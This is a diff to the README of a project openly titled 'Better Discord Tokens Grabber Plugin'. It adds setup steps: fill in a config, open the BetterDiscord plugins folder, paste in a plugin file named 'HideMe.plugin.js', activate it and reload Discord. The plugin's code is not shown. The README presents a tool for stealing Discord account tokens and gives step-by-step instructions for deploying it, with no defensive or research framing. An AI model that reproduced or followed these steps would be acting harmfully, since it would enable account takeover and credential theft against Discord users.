@@ -13,6 +13,14 @@ Better Discord Tokens Grabber Plugin
 - Trusted Domains List
 - Verified Games & Programs List
 
+# Setup
+- Fill up the [config](https://github.com/HideakiAtsuyo/BetterGrabber/blob/master/GOD/HideMe.plugin.js#L47-L57)
+- Windows + R
+- `%appdata%\BetterDiscord\plugins` then hit Enter
+- Paste the plugin, activate it
+- Reload Discord
+- Enjoy !
+
 # Known Issues
 - Streamer Mode Enabled => Discriminator hidden
 
